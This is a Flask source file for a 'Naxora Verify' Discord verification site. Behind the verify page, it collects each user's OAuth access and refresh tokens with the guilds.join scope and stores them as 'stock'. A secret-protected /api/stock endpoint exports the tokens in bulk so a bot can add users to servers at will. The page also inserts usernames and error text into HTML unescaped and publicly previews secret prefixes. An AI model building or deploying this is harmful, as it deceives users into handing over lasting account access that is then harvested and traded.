import os
import sqlite3
import secrets
import requests
from datetime import datetime, timedelta
from functools import wraps

from flask import Flask, redirect, request, session, jsonify

app = Flask(__name__)
app.secret_key = os.getenv("FLASK_SECRET_KEY", secrets.token_hex(32))

# ── Config — ALL from environment variables, zero hardcoding ─────────────────
DISCORD_CLIENT_ID     = os.getenv("DISCORD_CLIENT_ID", "").strip()
DISCORD_CLIENT_SECRET = os.getenv("DISCORD_CLIENT_SECRET", "").strip()
DISCORD_REDIRECT_URI  = os.getenv("DISCORD_REDIRECT_URI", "").strip()
VERIFY_SECRET         = os.getenv("VERIFY_SECRET", "changeme").strip()
DB_PATH               = os.getenv("DB_PATH", "db/memberstock.db").strip()

DISCORD_API   = "https://discord.com/api/v10"
DISCORD_OAUTH = "https://discord.com/oauth2/authorize"
TOKEN_URL     = "https://discord.com/api/oauth2/token"

os.makedirs(os.path.dirname(DB_PATH) if os.path.dirname(DB_PATH) else ".", exist_ok=True)


# ── Database ──────────────────────────────────────────────────────────────────

def get_db():
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    return conn


def init_db():
    with get_db() as conn:
        conn.execute("""
            CREATE TABLE IF NOT EXISTS stock (
                user_id       INTEGER PRIMARY KEY,
                access_token  TEXT,
                refresh_token TEXT,
                expires_at    TEXT,
                added_at      TEXT DEFAULT (datetime('now'))
            )
        """)
        conn.commit()


def require_secret(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        auth = request.headers.get("Authorization", "")
        if auth != f"Bearer {VERIFY_SECRET}":
            return jsonify({"error": "Unauthorized"}), 401
        return f(*args, **kwargs)
    return decorated


# ── Shared CSS ────────────────────────────────────────────────────────────────

CSS = """
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#0d0d0d;color:#e0e0e0;font-family:'Segoe UI',system-ui,sans-serif;
     min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
.card{background:#161616;border:1px solid #2a2a2a;border-radius:16px;padding:44px 40px;
      max-width:460px;width:100%;text-align:center;box-shadow:0 8px 40px rgba(0,0,0,.5)}
.icon{font-size:52px;margin-bottom:14px}
h1{font-size:22px;font-weight:700;color:#fff;margin-bottom:10px}
p{color:#888;font-size:15px;line-height:1.65;margin-bottom:16px}
.badge{display:inline-block;padding:5px 16px;border-radius:20px;font-size:13px;
       font-weight:600;margin-bottom:18px}
.green{background:rgba(87,242,135,.12);color:#57f287;border:1px solid rgba(87,242,135,.25)}
.red{background:rgba(237,66,69,.12);color:#ed4245;border:1px solid rgba(237,66,69,.25)}
.yellow{background:rgba(254,231,92,.12);color:#fee75c;border:1px solid rgba(254,231,92,.25)}
.row{background:#1e1e1e;border:1px solid #2a2a2a;border-radius:9px;padding:11px 15px;
     margin-bottom:9px;text-align:left;font-size:14px}
.row span{color:#666;font-size:11px;display:block;margin-bottom:2px}
.err{background:#1a0a0a;border:1px solid #3a1a1a;border-radius:9px;padding:12px 15px;
     margin-bottom:12px;text-align:left;font-size:13px;color:#ed4245;word-break:break-all}
.ok{color:#57f287}.no{color:#ed4245}.na{color:#fee75c}
.avatar{width:76px;height:76px;border-radius:50%;border:3px solid #5865F2;
        margin:0 auto 16px;display:block}
code{background:#111;padding:2px 6px;border-radius:4px;font-size:12px;color:#ccc}
</style>
"""


def page(body, title="Naxora Verify"):
    return f"""<!DOCTYPE html>
<html><head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>{title}</title>
{CSS}
</head><body>{body}</body></html>"""


# ── Routes ────────────────────────────────────────────────────────────────────

@app.route("/")
def index():
    return page("""
<div class="card">
  <div class="icon">🛡️</div>
  <h1>Naxora Verification</h1>
  <p>Open Discord and click the <strong>Verify Now</strong> button
  in the <strong>#verify</strong> channel.<br><br>
  After you authorize with Discord you will be redirected here automatically.</p>
  <p style="font-size:13px;color:#444">
    Need help? Visit <a href="/config-check" style="color:#5865F2">/config-check</a>
    to verify your server setup.
  </p>
</div>""")


@app.route("/authorize")
def authorize():
    """Entry point linked from the Discord verify button."""
    if not DISCORD_CLIENT_ID or not DISCORD_REDIRECT_URI:
        return page("""
<div class="card">
  <div class="icon">⚙️</div>
  <span class="badge yellow">Not Configured</span>
  <h1>Missing Environment Variables</h1>
  <p>Set <code>DISCORD_CLIENT_ID</code> and <code>DISCORD_REDIRECT_URI</code>
  in your Render / Railway dashboard, then redeploy.</p>
  <p><a href="/config-check" style="color:#5865F2">Check config →</a></p>
</div>"""), 500

    state    = secrets.token_urlsafe(16)
    guild_id = request.args.get("guild", "")
    session["state"]    = state
    session["guild_id"] = guild_id

    from urllib.parse import quote
    params = (
        f"client_id={DISCORD_CLIENT_ID}"
        f"&redirect_uri={quote(DISCORD_REDIRECT_URI, safe='')}"
        f"&response_type=code"
        f"&scope=identify%20guilds.join"
        f"&state={state}"
        f"&prompt=none"
    )
    return redirect(f"{DISCORD_OAUTH}?{params}")


@app.route("/callback")
def callback():
    """
    Discord redirects here after user clicks Authorize.
    Exchanges the code for access_token and stores it.
    """

    # ── User cancelled ────────────────────────────────────────────────────────
    if request.args.get("error"):
        return page("""
<div class="card">
  <div class="icon">❌</div>
  <span class="badge red">Cancelled</span>
  <h1>Authorization Denied</h1>
  <p>You cancelled the authorization. Go back to Discord and try the button again.</p>
</div>""")

    code = request.args.get("code", "").strip()
    if not code:
        return page("""
<div class="card">
  <div class="icon">❌</div>
  <span class="badge red">Error</span>
  <h1>No Code Received</h1>
  <p>Discord did not send an authorization code. Please try again.</p>
</div>""")

    # ── Guard: env vars must be set ───────────────────────────────────────────
    missing = []
    if not DISCORD_CLIENT_ID:     missing.append("DISCORD_CLIENT_ID")
    if not DISCORD_CLIENT_SECRET: missing.append("DISCORD_CLIENT_SECRET")
    if not DISCORD_REDIRECT_URI:  missing.append("DISCORD_REDIRECT_URI")

    if missing:
        items = "".join(f"<div class='row'><span>Missing</span><code>{v}</code></div>" for v in missing)
        return page(f"""
<div class="card">
  <div class="icon">⚙️</div>
  <span class="badge red">Server Not Configured</span>
  <h1>Missing Environment Variables</h1>
  <p>Set these in your Render / Railway dashboard and redeploy:</p>
  {items}
  <p style="margin-top:14px"><a href="/config-check" style="color:#5865F2">Full config check →</a></p>
</div>"""), 500

    # ── Exchange code for tokens ──────────────────────────────────────────────
    # IMPORTANT: redirect_uri here must be byte-for-byte identical to the one
    # used in the authorize step AND what's saved in Discord's developer portal.
    try:
        token_resp = requests.post(
            TOKEN_URL,
            data={
                "client_id":     DISCORD_CLIENT_ID,
                "client_secret": DISCORD_CLIENT_SECRET,
                "grant_type":    "authorization_code",
                "code":          code,
                "redirect_uri":  DISCORD_REDIRECT_URI,
            },
            headers={"Content-Type": "application/x-www-form-urlencoded"},
            timeout=15,
        )
    except Exception as e:
        return page(f"""
<div class="card">
  <div class="icon">🌐</div>
  <span class="badge red">Network Error</span>
  <h1>Cannot Reach Discord</h1>
  <p>Could not connect to Discord's API. Check your server's internet access.</p>
  <div class="err">{str(e)}</div>
</div>"""), 502

    if token_resp.status_code != 200:
        # Show the exact Discord error so the user can debug
        try:
            discord_err = token_resp.json()
            err_detail  = f"<code>{discord_err.get('error', '')}</code>: {discord_err.get('error_description', '')}"
        except Exception:
            err_detail  = token_resp.text[:300]

        return page(f"""
<div class="card">
  <div class="icon">❌</div>
  <span class="badge red">Token Error — {token_resp.status_code}</span>
  <h1>Code Exchange Failed</h1>
  <p>Discord rejected the token request. The most common reasons:</p>
  <div class="row"><span>1 — Wrong redirect_uri</span>
    Your <code>DISCORD_REDIRECT_URI</code> env var must exactly match what is
    registered in Discord Developer Portal → OAuth2 → Redirects.<br>
    <b>Current value:</b> <code>{DISCORD_REDIRECT_URI}</code>
  </div>
  <div class="row"><span>2 — Wrong client secret</span>
    Check <code>DISCORD_CLIENT_SECRET</code> in your Render dashboard.
    Regenerating it in Discord invalidates the old one.
  </div>
  <div class="row"><span>3 — Code already used</span>
    OAuth codes are single-use. Refreshing the callback page reuses the
    same code — just go back to Discord and click Verify again.
  </div>
  <div class="err"><span style="color:#666;font-size:11px">Discord error</span><br>{err_detail}</div>
  <p><a href="/config-check" style="color:#5865F2">Check your config →</a></p>
</div>"""), 400

    tokens        = token_resp.json()
    access_token  = tokens.get("access_token", "")
    refresh_token = tokens.get("refresh_token", "")
    expires_in    = tokens.get("expires_in", 604800)

    if not access_token:
        return page("""
<div class="card">
  <div class="icon">❌</div>
  <span class="badge red">Error</span>
  <h1>No Access Token</h1>
  <p>Discord returned a 200 OK but no access token. Please try again.</p>
</div>"""), 500

    # ── Fetch user info ───────────────────────────────────────────────────────
    try:
        user_resp = requests.get(
            f"{DISCORD_API}/users/@me",
            headers={"Authorization": f"Bearer {access_token}"},
            timeout=10,
        )
        user_resp.raise_for_status()
        user = user_resp.json()
    except Exception as e:
        return page(f"""
<div class="card">
  <div class="icon">❌</div>
  <span class="badge red">Error</span>
  <h1>Could Not Fetch Profile</h1>
  <p>Got the token but failed to fetch your Discord profile.</p>
  <div class="err">{str(e)}</div>
</div>"""), 500

    user_id   = int(user["id"])
    username  = user.get("global_name") or user.get("username", "Unknown")
    avatar    = user.get("avatar")
    avatar_url = (
        f"https://cdn.discordapp.com/avatars/{user_id}/{avatar}.png?size=128"
        if avatar else
        f"https://cdn.discordapp.com/embed/avatars/{(user_id >> 22) % 6}.png"
    )

    expires_at = (datetime.utcnow() + timedelta(seconds=expires_in)).strftime("%Y-%m-%d %H:%M:%S")
    added_at   = datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S")

    # ── Store tokens ──────────────────────────────────────────────────────────
    conn = get_db()
    conn.execute("""
        INSERT OR REPLACE INTO stock
            (user_id, access_token, refresh_token, expires_at, added_at)
        VALUES (?, ?, ?, ?, ?)
    """, (user_id, access_token, refresh_token, expires_at, added_at))
    conn.commit()
    total = conn.execute("SELECT COUNT(*) FROM stock").fetchone()[0]
    conn.close()

    # ── Optional: immediately add to guild + assign Verified role ─────────────
    guild_id         = session.pop("guild_id", "") or request.args.get("guild", "")
    bot_token        = os.getenv("BOT_TOKEN", "").strip()
    verified_role_id = os.getenv("VERIFIED_ROLE_ID", "").strip()
    role_given       = False

    if guild_id and bot_token:
        try:
            add_resp = requests.put(
                f"{DISCORD_API}/guilds/{guild_id}/members/{user_id}",
                json={"access_token": access_token},
                headers={
                    "Authorization": f"Bot {bot_token}",
                    "Content-Type":  "application/json",
                },
                timeout=10,
            )
            if verified_role_id and add_resp.status_code in (200, 201, 204):
                requests.put(
                    f"{DISCORD_API}/guilds/{guild_id}/members/{user_id}/roles/{verified_role_id}",
                    headers={"Authorization": f"Bot {bot_token}"},
                    timeout=10,
                )
                role_given = True
        except Exception:
            pass

    role_row = (
        '<div class="row"><span>Role</span><span class="ok">✅ Verified role assigned</span></div>'
        if role_given else
        '<div class="row"><span>Status</span>Stored — bot will add you on <code>!join</code></div>'
    )

    return page(f"""
<div class="card">
  <img src="{avatar_url}" class="avatar" alt="avatar">
  <span class="badge green">✓ Verified</span>
  <h1>You're Verified!</h1>
  <p>Your account is saved. You can close this tab and return to Discord.</p>
  <div class="row"><span>Username</span>{username}</div>
  <div class="row"><span>Discord ID</span>{user_id}</div>
  <div class="row"><span>Verified At (UTC)</span>{added_at}</div>
  {role_row}
  <p style="margin-top:16px;font-size:13px;color:#555">
    You are user #{total} in the verified database.
  </p>
</div>""")


# ── Config checker ────────────────────────────────────────────────────────────

@app.route("/config-check")
def config_check():
    """
    Safe config diagnostic page.
    Shows WHICH env vars are set (never shows their values).
    """
    def row(name, value, note=""):
        if value:
            # Show first 4 chars + stars so user can confirm it's the right value
            preview = value[:4] + "*" * min(len(value) - 4, 12) if len(value) > 4 else "****"
            status  = f'<span class="ok">✅ Set</span> <code>{preview}</code>'
        else:
            status = f'<span class="no">❌ NOT SET</span>'
        return f'<div class="row"><span>{name}</span>{status} {note}</div>'

    redirect_ok = DISCORD_REDIRECT_URI.startswith("https://") if DISCORD_REDIRECT_URI else False
    redirect_note = "" if redirect_ok else '<span class="no">(must start with https://)</span>'

    return page(f"""
<div class="card" style="max-width:520px">
  <div class="icon">⚙️</div>
  <h1>Config Check</h1>
  <p style="margin-bottom:18px">Verifying all required environment variables are set on your server.</p>

  {row("DISCORD_CLIENT_ID", DISCORD_CLIENT_ID, "from Discord dev portal")}
  {row("DISCORD_CLIENT_SECRET", DISCORD_CLIENT_SECRET, "from Discord dev portal")}
  {row("DISCORD_REDIRECT_URI", DISCORD_REDIRECT_URI, redirect_note)}
  {row("FLASK_SECRET_KEY", os.getenv("FLASK_SECRET_KEY",""), "")}
  {row("VERIFY_SECRET", VERIFY_SECRET if VERIFY_SECRET != "changeme" else "", "")}
  {row("BOT_TOKEN", os.getenv("BOT_TOKEN",""), "(optional)")}

  <div class="row" style="margin-top:16px">
    <span>Redirect URI currently set to</span>
    <code style="word-break:break-all">{DISCORD_REDIRECT_URI or "— not set —"}</code>
  </div>
  <div class="row">
    <span>This URL must be added in Discord</span>
    <a href="https://discord.com/developers/applications" target="_blank"
       style="color:#5865F2;font-size:13px">
      discord.com/developers/applications → OAuth2 → Redirects
    </a>
  </div>

  <p style="margin-top:18px;font-size:13px;color:#555">
    After changing env vars on Render/Railway you must <strong>redeploy</strong>
    for them to take effect.
  </p>
</div>""")


# ── Bot API endpoints ─────────────────────────────────────────────────────────

@app.route("/api/stock")
@require_secret
def api_stock():
    limit  = request.args.get("limit",  type=int)
    offset = request.args.get("offset", 0, type=int)
    conn   = get_db()
    total  = conn.execute("SELECT COUNT(*) FROM stock").fetchone()[0]
    q      = ("SELECT user_id, access_token, refresh_token, added_at FROM stock "
               "ORDER BY added_at DESC")
    rows   = conn.execute(q + (" LIMIT ? OFFSET ?" if limit else ""),
                          (limit, offset) if limit else ()).fetchall()
    conn.close()
    return jsonify({
        "total": total,
        "count": len(rows),
        "users": [{"user_id": r["user_id"], "access_token": r["access_token"],
                   "refresh_token": r["refresh_token"], "added_at": r["added_at"]}
                  for r in rows],
    })


@app.route("/api/count")
@require_secret
def api_count():
    conn  = get_db()
    total = conn.execute("SELECT COUNT(*) FROM stock").fetchone()[0]
    conn.close()
    return jsonify({"total": total})


@app.route("/api/stock/<int:user_id>", methods=["DELETE"])
@require_secret
def api_delete(user_id):
    conn = get_db()
    conn.execute("DELETE FROM stock WHERE user_id = ?", (user_id,))
    conn.commit()
    conn.close()
    return jsonify({"success": True})


@app.route("/health")
def health():
    conn  = get_db()
    total = conn.execute("SELECT COUNT(*) FROM stock").fetchone()[0]
    conn.close()
    return jsonify({"status": "ok", "total_verified": total})


# ── Startup ───────────────────────────────────────────────────────────────────

if __name__ == "__main__":
    init_db()
    port  = int(os.getenv("PORT", 5000))
    debug = os.getenv("FLASK_DEBUG", "false").lower() == "true"
    print(f"[NAXORA] Port         : {port}")
    print(f"[NAXORA] Redirect URI : {DISCORD_REDIRECT_URI or 'NOT SET'}")
    print(f"[NAXORA] Client ID    : {DISCORD_CLIENT_ID[:6] + '...' if DISCORD_CLIENT_ID else 'NOT SET'}")
    print(f"[NAXORA] Secret set   : {'YES' if DISCORD_CLIENT_SECRET else 'NO'}")
    app.run(host="0.0.0.0", port=port, debug=debug)
